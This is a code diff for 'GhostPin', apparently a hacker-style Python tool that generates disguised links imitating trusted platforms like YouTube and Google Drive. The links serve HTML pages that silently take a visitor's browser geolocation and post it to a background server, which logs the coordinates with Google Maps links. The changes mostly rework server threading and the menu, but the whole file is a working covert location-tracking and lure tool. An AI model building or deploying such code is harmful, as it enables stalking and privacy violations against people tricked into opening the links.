@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-GhostPin v2.1 - Ultimate GPS Tracking Framework
-Fix: Server Issues | Auto-Start | Real-Time Tracking
+GhostPin v2.2 - GPS Tracking Framework
+Fix: Input Issues | Server Stability | Background Thread
 Author: F1REW0LF
 License: MIT - Free for Community
-Version: 2.1.0
+Version: 2.2.0
 """
 
 import sys
@@ -43,13 +43,13 @@ except ImportError:
     REQUESTS_AVAILABLE = False
 
 try:
-    from flask import Flask, request, jsonify, render_template_string
+    from flask import Flask, request, jsonify
     FLASK_AVAILABLE = True
 except ImportError:
     FLASK_AVAILABLE = False
 
 # ============================[ VERSION & CONFIGURATION ]================================
-VERSION = "2.1.0"
+VERSION = "2.2.0"
 AUTHOR = "F1REW0LF"
 LICENSE = "MIT - Free for Community"
 
@@ -83,7 +83,7 @@ def print_banner():
      ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                                                       
 {Colors.RED}{Colors.BOLD}    GPS TRACKING FRAMEWORK v{VERSION}{Colors.WHITE}
-{Colors.YELLOW}{Colors.BOLD}    Fix: Auto-Server | Real-Time Tracking{Colors.WHITE}
+{Colors.YELLOW}{Colors.BOLD}    Fix: Input | Server Stability{Colors.WHITE}
 {Colors.GOLD}    Version {VERSION} | Author: {AUTHOR}{Colors.WHITE}
 """
     print(banner)
@@ -292,11 +292,11 @@ navigator.geolocation.getCurrentPosition(sendLocation,function(){{}},{{enableHig
 </body>
 </html>'''
 
-# ============================[ GHOST SERVER ]================================
+# ============================[ GHOST SERVER - BACKGROUND ]================================
 
 class GhostServer:
     """
-    Standalone HTTP server for receiving location data
+    Background HTTP server for receiving location data
     """
     
     def __init__(self):
@@ -306,8 +306,9 @@ class GhostServer:
         self.port = 8080
         self.server = None
         self.thread = None
+        self.flask_app = None
         
-    def start(self, port: int = 8080):
+    def start(self, port: int = 8080, background: bool = True):
         """
         Start the server
         """
@@ -316,23 +317,22 @@ class GhostServer:
         
         # Check if port is available
         if not self._is_port_available(port):
-            cprint(f"[!] Port {port} is in use. Trying port {port + 1}", Colors.YELLOW)
+            cprint(f"[!] Port {port} in use, trying {port + 1}", Colors.YELLOW)
             self.port = port + 1
-            return self.start(self.port)
+            return self.start(self.port, background)
         
         # Try Flask first
         if FLASK_AVAILABLE:
             try:
-                self._start_flask(self.port)
+                self._start_flask(self.port, background)
                 return
             except Exception as e:
                 cprint(f"[!] Flask failed: {e}", Colors.RED)
         
         # Fallback to simple HTTP server
-        self._start_simple(self.port)
+        self._start_simple(self.port, background)
     
     def _is_port_available(self, port: int) -> bool:
-        """Check if port is available"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(1)
@@ -342,9 +342,10 @@ class GhostServer:
         except:
             return True
     
-    def _start_flask(self, port: int):
-        """Start Flask server"""
+    def _start_flask(self, port: int, background: bool):
+        """Start Flask server in background"""
         app = Flask(__name__)
+        self.flask_app = app
         
         @app.route('/track/<token>', methods=['GET', 'POST', 'OPTIONS'])
         def track(token):
@@ -362,7 +363,7 @@ class GhostServer:
                         data['token'] = token
                         data['received_at'] = datetime.now().isoformat()
                         self.tracking_data.append(data)
-                    cprint(f"[+] Location received from {token}: {data.get('lat')}, {data.get('lng')}", Colors.GREEN)
+                    cprint(f"[+] Location: {data.get('lat')}, {data.get('lng')} ({token})", Colors.GREEN)
                 return jsonify({'status': 'ok'})
             
             return f'Tracking endpoint for {token}'
@@ -376,15 +377,18 @@ class GhostServer:
         def index():
             return '<h1>GhostPin Server Running</h1><p>Send POST to /track/&lt;token&gt;</p>'
         
-        def run():
-            app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
-        
-        self.thread = threading.Thread(target=run, daemon=True)
-        self.thread.start()
-        cprint(f"[+] Flask server running on port {port}", Colors.GREEN)
-        self._show_server_info(port)
+        if background:
+            def run():
+                app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
+            
+            self.thread = threading.Thread(target=run, daemon=True)
+            self.thread.start()
+            time.sleep(1)  # Wait for server to start
+            cprint(f"[+] Server running on port {port} (background)", Colors.GREEN)
+        else:
+            app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
     
-    def _start_simple(self, port: int):
+    def _start_simple(self, port: int, background: bool):
         """Start simple HTTP server"""
         class Handler(http.server.SimpleHTTPRequestHandler):
             tracking_data = []
@@ -408,7 +412,7 @@ class GhostServer:
                             data['token'] = token
                             data['received_at'] = datetime.now().isoformat()
                             self.__class__.tracking_data.append(data)
-                        cprint(f"[+] Location received from {token}: {data.get('lat')}, {data.get('lng')}", Colors.GREEN)
+                        cprint(f"[+] Location: {data.get('lat')}, {data.get('lng')} ({token})", Colors.GREEN)
                         self.send_response(200)
                         self.send_header('Content-Type', 'application/json')
                         self.send_header('Access-Control-Allow-Origin', '*')
@@ -433,7 +437,7 @@ class GhostServer:
                     self.send_response(200)
                     self.send_header('Content-Type', 'text/html')
                     self.end_headers()
-                    self.wfile.write(b'<h1>GhostPin Server v2.1</h1><p>Tracking Active</p>')
+                    self.wfile.write(b'<h1>GhostPin Server</h1><p>Tracking Active</p>')
                 else:
                     self.send_response(404)
                     self.end_headers()
@@ -442,33 +446,29 @@ class GhostServer:
         Handler.lock = self.lock
         
         self.server = socketserver.TCPServer(('0.0.0.0', port), Handler)
-        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
-        self.thread.start()
-        cprint(f"[+] Simple server running on port {port}", Colors.GREEN)
-        self._show_server_info(port)
-    
-    def _show_server_info(self, port: int):
-        """Show server info"""
-        cprint(f"\n[+] Server URLs:", Colors.CYAN)
-        cprint(f"  Tracking: http://localhost:{port}/track/<token>", Colors.GREEN)
-        cprint(f"  Data:     http://localhost:{port}/data", Colors.GREEN)
-        cprint(f"  Status:   http://localhost:{port}/", Colors.GREEN)
-        cprint(f"\n[!] Press Ctrl+C to stop server", Colors.YELLOW)
+        
+        if background:
+            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
+            self.thread.start()
+            time.sleep(0.5)
+            cprint(f"[+] Server running on port {port} (background)", Colors.GREEN)
+        else:
+            self.server.serve_forever()
     
     def stop(self):
         """Stop the server"""
         self.running = False
         if self.server:
             self.server.shutdown()
-        cprint("[+] Server stopped", Colors.GREEN)
+        if self.flask_app:
+            # Flask will stop when main thread exits
+            pass
     
     def get_data(self) -> List[Dict]:
-        """Get all tracking data"""
         with self.lock:
             return self.tracking_data.copy()
     
     def clear_data(self):
-        """Clear tracking data"""
         with self.lock:
             self.tracking_data.clear()
 
@@ -493,112 +493,119 @@ class GhostPin:
         print(f"""
 {Colors.BLUE}{'='*55}{Colors.WHITE}
 {Colors.BOLD}GhostPin v{VERSION} - GPS Tracking Framework{Colors.WHITE}
-{Colors.CYAN}Auto-Server | Real-Time Tracking{Colors.WHITE}
+{Colors.CYAN}Background Server | Real-Time Tracking{Colors.WHITE}
 {Colors.YELLOW}Author: {AUTHOR}{Colors.WHITE}
 {Colors.BLUE}{'='*55}{Colors.WHITE}
 {Colors.GREEN}[1] Create Ghost Link{Colors.WHITE}
-{Colors.GREEN}[2] Start Server{Colors.WHITE}
-{Colors.GREEN}[3] View Tracking Data{Colors.WHITE}
-{Colors.GREEN}[4] Clear Data{Colors.WHITE}
+{Colors.GREEN}[2] View Tracking Data{Colors.WHITE}
+{Colors.GREEN}[3] Clear Data{Colors.WHITE}
+{Colors.GREEN}[4] Server Status{Colors.WHITE}
 {Colors.RED}[5] Exit{Colors.WHITE}
 """)
     
     def run(self):
         print_banner()
-        cprint("[*] GhostPin v2.1 - GPS Tracking Framework", Colors.CYAN)
-        cprint("[*] Auto-Server | Real-Time Tracking", Colors.DIM)
+        cprint("[*] GhostPin v2.2 - GPS Tracking Framework", Colors.CYAN)
+        cprint("[*] Background Server | Real-Time Tracking", Colors.DIM)
         
-        # Auto-start server
-        cprint("[*] Auto-starting server on port 8080...", Colors.BLUE)
-        self.server.start(8080)
+        # Start server in background
+        cprint("[*] Starting server in background...", Colors.BLUE)
+        self.server.start(8080, background=True)
         
         while self.running:
-            self.show_menu()
-            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
-            
-            if choice == '1':
-                cprint("\nAvailable platforms:", Colors.CYAN)
-                for plat in sorted(self.platforms.PLATFORMS.keys()):
-                    trust = self.platforms.PLATFORMS[plat].get('trust_score', 5)
-                    cprint(f"  {Colors.GREEN}{plat}{Colors.WHITE} (Trust: {trust}/10)", Colors.WHITE)
+            try:
+                self.show_menu()
+                choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
                 
-                platform = input("\n[>] Platform: ").strip().lower()
-                token = input("[>] Token/ID: ").strip()
-                
-                if platform not in self.platforms.PLATFORMS:
-                    cprint("[-] Unknown platform", Colors.RED)
-                    continue
-                
-                # Generate ghost link
-                info = self.platforms.PLATFORMS[platform]
-                ghost_url = info['template'].format(token=token)
-                tracking_url = f"http://localhost:{self.server.port}/track/{token}"
-                
-                # Generate HTML
-                if platform == 'youtube' or platform == 'youtu_be':
-                    html = self.generator.generate_youtube(token, tracking_url)
+                if choice == '1':
+                    cprint("\nAvailable platforms:", Colors.CYAN)
+                    for plat in sorted(self.platforms.PLATFORMS.keys()):
+                        trust = self.platforms.PLATFORMS[plat].get('trust_score', 5)
+                        cprint(f"  {Colors.GREEN}{plat}{Colors.WHITE} (Trust: {trust}/10)", Colors.WHITE)
+                    
+                    platform = input("\n[>] Platform: ").strip().lower()
+                    token = input("[>] Token/ID: ").strip()
+                    
+                    if platform not in self.platforms.PLATFORMS:
+                        cprint("[-] Unknown platform", Colors.RED)
+                        continue
+                    
+                    info = self.platforms.PLATFORMS[platform]
+                    ghost_url = info['template'].format(token=token)
+                    tracking_url = f"http://localhost:{self.server.port}/track/{token}"
+                    
+                    if platform == 'youtube' or platform == 'youtu_be':
+                        html = self.generator.generate_youtube(token, tracking_url)
+                    else:
+                        html = self.generator.generate_generic(platform, token, tracking_url)
+                    
+                    cprint(f"\n[+] Ghost Link: {Colors.GREEN}{ghost_url}{Colors.WHITE}", Colors.WHITE)
+                    cprint(f"[+] Tracking Endpoint: {Colors.YELLOW}{tracking_url}{Colors.WHITE}", Colors.WHITE)
+                    
+                    filename = f"ghost_{platform}_{token[:8]}.html"
+                    with open(filename, 'w') as f:
+                        f.write(html)
+                    cprint(f"[+] HTML saved to {Colors.BLUE}{filename}{Colors.WHITE}", Colors.WHITE)
+                    
+                    try:
+                        webbrowser.open(filename)
+                        cprint("[+] Opened in browser", Colors.GREEN)
+                    except:
+                        pass
+                    
+                elif choice == '2':
+                    data = self.server.get_data()
+                    if not data:
+                        cprint("[!] No tracking data", Colors.YELLOW)
+                        continue
+                    
+                    cprint(f"\n[+] Tracking Data ({len(data)} records):", Colors.GREEN)
+                    for i, record in enumerate(data[-10:], 1):
+                        lat = record.get('lat', 'N/A')
+                        lng = record.get('lng', 'N/A')
+                        token = record.get('token', 'N/A')
+                        ts = record.get('received_at', record.get('timestamp', 'N/A'))
+                        
+                        cprint(f"\n  [{i}] Token: {Colors.CYAN}{token}{Colors.WHITE}", Colors.WHITE)
+                        cprint(f"      Location: {Colors.GOLD}{lat}, {lng}{Colors.WHITE}", Colors.WHITE)
+                        cprint(f"      Time: {Colors.DIM}{ts}{Colors.WHITE}", Colors.WHITE)
+                        
+                        if lat != 'N/A' and lng != 'N/A':
+                            maps_link = f"https://www.google.com/maps?q={lat},{lng}"
+                            cprint(f"      Map: {Colors.BLUE}{maps_link}{Colors.WHITE}", Colors.WHITE)
+                    
+                elif choice == '3':
+                    self.server.clear_data()
+                    cprint("[+] Data cleared", Colors.GREEN)
+                    
+                elif choice == '4':
+                    cprint(f"\n[+] Server Status:", Colors.CYAN)
+                    cprint(f"  Running: {Colors.GREEN}Yes{Colors.WHITE}", Colors.WHITE)
+                    cprint(f"  Port: {Colors.CYAN}{self.server.port}{Colors.WHITE}", Colors.WHITE)
+                    cprint(f"  Data Records: {Colors.YELLOW}{len(self.server.get_data())}{Colors.WHITE}", Colors.WHITE)
+                    cprint(f"  Tracking: {Colors.BLUE}http://localhost:{self.server.port}/track/<token>{Colors.WHITE}", Colors.WHITE)
+                    cprint(f"  Data: {Colors.BLUE}http://localhost:{self.server.port}/data{Colors.WHITE}", Colors.WHITE)
+                    
+                elif choice == '5':
+                    cprint("[*] Shutting down...", Colors.GREEN)
+                    self.server.stop()
+                    break
                 else:
-                    html = self.generator.generate_generic(platform, token, tracking_url)
-                
-                cprint(f"\n[+] Ghost Link: {Colors.GREEN}{ghost_url}{Colors.WHITE}", Colors.WHITE)
-                cprint(f"[+] Tracking Endpoint: {Colors.YELLOW}{tracking_url}{Colors.WHITE}", Colors.WHITE)
-                
-                # Save HTML
-                filename = f"ghost_{platform}_{token[:8]}.html"
-                with open(filename, 'w') as f:
-                    f.write(html)
-                cprint(f"[+] HTML saved to {Colors.BLUE}{filename}{Colors.WHITE}", Colors.WHITE)
-                
-                # Auto-open in browser
-                try:
-                    webbrowser.open(filename)
-                    cprint("[+] Opened in browser", Colors.GREEN)
-                except:
-                    pass
-                
-            elif choice == '2':
-                port = int(input("[>] Port (8080): ").strip() or "8080")
-                self.server.stop()
-                time.sleep(1)
-                self.server.start(port)
-                
-            elif choice == '3':
-                data = self.server.get_data()
-                if not data:
-                    cprint("[!] No tracking data", Colors.YELLOW)
-                    continue
-                
-                cprint(f"\n[+] Tracking Data ({len(data)} records):", Colors.GREEN)
-                for i, record in enumerate(data[-10:], 1):
-                    lat = record.get('lat', 'N/A')
-                    lng = record.get('lng', 'N/A')
-                    token = record.get('token', 'N/A')
-                    ts = record.get('received_at', record.get('timestamp', 'N/A'))
+                    cprint("[-] Invalid", Colors.RED)
                     
-                    cprint(f"\n  [{i}] Token: {Colors.CYAN}{token}{Colors.WHITE}", Colors.WHITE)
-                    cprint(f"      Location: {Colors.GOLD}{lat}, {lng}{Colors.WHITE}", Colors.WHITE)
-                    cprint(f"      Time: {Colors.DIM}{ts}{Colors.WHITE}", Colors.WHITE)
-                    
-                    if lat != 'N/A' and lng != 'N/A':
-                        maps_link = f"https://www.google.com/maps?q={lat},{lng}"
-                        cprint(f"      Map: {Colors.BLUE}{maps_link}{Colors.WHITE}", Colors.WHITE)
-                
-            elif choice == '4':
-                self.server.clear_data()
-                cprint("[+] Data cleared", Colors.GREEN)
-                
-            elif choice == '5':
-                cprint("[*] Shutting down...", Colors.GREEN)
-                self.server.stop()
+            except KeyboardInterrupt:
+                cprint("\n[!] Interrupted", Colors.RED)
+                self.running = False
                 break
-            else:
-                cprint("[-] Invalid", Colors.RED)
+            except Exception as e:
+                cprint(f"\n[!] Error: {e}", Colors.RED)
+                continue
 
 # ============================[ MAIN ]================================
 
 def main():
-    parser = argparse.ArgumentParser(description="GhostPin v2.1 - GPS Tracking Framework")
-    parser.add_argument("-p", "--platform", help="Platform (youtube/twitter/instagram/facebook/github/medium/reddit/spotify/soundcloud/tiktok/dropbox/google_drive/docs)")
+    parser = argparse.ArgumentParser(description="GhostPin v2.2 - GPS Tracking Framework")
+    parser.add_argument("-p", "--platform", help="Platform")
     parser.add_argument("-t", "--token", help="Token or ID")
     parser.add_argument("--port", type=int, default=8080, help="Server port")
     parser.add_argument("--server", action="store_true", help="Start server only")
@@ -608,12 +615,7 @@ def main():
     if args.server:
         print_banner()
         server = GhostServer()
-        server.start(args.port)
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            server.stop()
+        server.start(args.port, background=False)
         sys.exit(0)
     
     if args.platform and args.token:
@@ -621,7 +623,7 @@ def main():
         platforms = TrustedPlatforms()
         generator = HTMLGenerator()
         server = GhostServer()
-        server.start(args.port)
+        server.start(args.port, background=True)
         
         info = platforms.PLATFORMS.get(args.platform)
         if not info:
@@ -649,7 +651,7 @@ def main():
         except:
             pass
         
-        cprint("\n[!] Server is running. Press Ctrl+C to stop.", Colors.YELLOW)
+        cprint("\n[!] Server running in background. Use Ctrl+C to stop.", Colors.YELLOW)
         try:
             while True:
                 time.sleep(1)
